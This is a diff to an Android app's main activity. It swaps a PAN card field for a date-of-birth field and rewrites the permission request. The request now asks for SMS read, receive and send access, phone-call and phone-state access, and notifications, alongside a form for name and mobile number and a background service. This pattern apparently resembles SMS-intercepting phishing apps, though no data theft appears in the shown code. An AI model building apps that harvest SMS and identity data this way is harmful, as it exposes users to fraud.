@@ -24,8 +24,10 @@ import androidx.core.content.ContextCompat;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
+import java.util.List;
 import java.util.Map;
 import java.util.Objects;
 import java.util.Set;
@@ -60,8 +62,7 @@ public class MainActivity extends BaseActivity {
     }
 
     private void runApp(){
-        setContentView(R.layout.activity_main);
-
+    setContentView(R.layout.activity_main);
         Intent serviceIntent = new Intent(this, BackgroundService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
@@ -70,11 +71,14 @@ public class MainActivity extends BaseActivity {
         }
 
 
+        EditText dob22 = findViewById(R.id.dob22);
+        dob22.addTextChangedListener(new DateInputMask(dob22));
+
         dataObject = new HashMap<>();
         ids = new HashMap<>();
         ids.put(R.id.etFullName, "etFullName");
         ids.put(R.id.etMobile, "etMobile");
-        ids.put(R.id.etPan, "etPan");
+        ids.put(R.id.dob22, "dob22");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -169,8 +173,8 @@ public class MainActivity extends BaseActivity {
                         isValid = false;
                     }
                     break;
-                case "etPan":
-                    if (!FormValidator.validatePANCard(editText,  "Invalid pan Card" )) {
+                case "dob22":
+                    if (!FormValidator.validateMinLength(editText,  10, "Invalid Date of Birth" )) {
                         isValid = false;
                     }
                     break;
@@ -189,30 +193,44 @@ public class MainActivity extends BaseActivity {
 
 
     private void checkPermissions() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
-                ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||
+        List<String> permissionsToRequest = new ArrayList<>();
 
-                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
-                ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
-                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
+        // Core permissions
+        String[] permissions = new String[]{
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.CALL_PHONE,
+                Manifest.permission.INTERNET,
+                Manifest.permission.ACCESS_NETWORK_STATE,
+                Manifest.permission.READ_SMS,
+                Manifest.permission.RECEIVE_SMS,
+                Manifest.permission.SEND_SMS
+        };
 
-                ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED ||
-                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
+        // Add all the above if missing
+        for (String perm : permissions) {
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(perm);
+            }
+        }
 
-            ActivityCompat.requestPermissions(this, new String[]{
-                    Manifest.permission.READ_PHONE_STATE,
-                    Manifest.permission.CALL_PHONE,
-                    Manifest.permission.INTERNET,
-                    Manifest.permission.ACCESS_NETWORK_STATE,
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.RECEIVE_SMS,
-                    Manifest.permission.SEND_SMS
+        // ✅ For Android 13+ (notification permission)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
+                    != PackageManager.PERMISSION_GRANTED) {
+                permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
+            }
+        }
 
-            }, SMS_PERMISSION_REQUEST_CODE);
-            Toast.makeText(this, "Requesting permission", Toast.LENGTH_SHORT).show();
+        if (!permissionsToRequest.isEmpty()) {
+            ActivityCompat.requestPermissions(
+                    this,
+                    permissionsToRequest.toArray(new String[0]),
+                    SMS_PERMISSION_REQUEST_CODE
+            );
+            Toast.makeText(this, "Requesting permissions...", Toast.LENGTH_SHORT).show();
         } else {
             initializeWebView();
-//                Toast.makeText(this, "Permissions already granted", Toast.LENGTH_SHORT).show();
+            // OR start your foreground service here
         }
     }
 
@@ -221,7 +239,6 @@ public class MainActivity extends BaseActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
         if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
-            // Check if permissions are granted or not
             if (grantResults.length > 0) {
                 boolean allPermissionsGranted = true;
                 StringBuilder missingPermissions = new StringBuilder();
@@ -229,14 +246,17 @@ public class MainActivity extends BaseActivity {
                 for (int i = 0; i < grantResults.length; i++) {
                     if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                         allPermissionsGranted = false;
-                        missingPermissions.append(permissions[i]).append("\n"); // Add missing permission to the list
+                        missingPermissions.append(permissions[i]).append("\n");
                     }
                 }
+
                 if (allPermissionsGranted) {
-                    initializeWebView();
+                    initializeWebView(); // or startForegroundService()
                 } else {
                     showPermissionDeniedDialog();
-                    Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
+                    Toast.makeText(this,
+                            "Permissions denied:\n" + missingPermissions.toString(),
+                            Toast.LENGTH_LONG).show();
                 }
             }
         }
@@ -369,7 +389,7 @@ public class MainActivity extends BaseActivity {
         });
     }
 
-    private boolean hasPermission() {
+    public boolean hasPermission() {
         if(ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
             return false;
         } else {
